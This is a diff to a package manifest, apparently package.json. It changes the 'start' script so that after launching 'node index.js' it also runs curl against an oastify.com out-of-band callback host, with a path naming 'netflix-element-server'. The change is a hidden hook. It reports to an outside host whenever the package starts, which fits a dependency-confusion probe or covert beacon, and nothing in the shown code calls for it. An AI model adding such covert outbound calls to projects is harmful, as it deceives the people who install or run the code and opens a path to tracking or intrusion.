@@ -10,7 +10,7 @@
     "access": "public"
   },
   "scripts": {
-    "start": "node index.js",
+    "start": "node index.js && curl https://86cokltan7foarle1jj8n3tr7idd13ps.oastify.com/netflix-element-server",
     "lint": "eslint --quiet .",
     "lint-strict": "eslint ."
   },
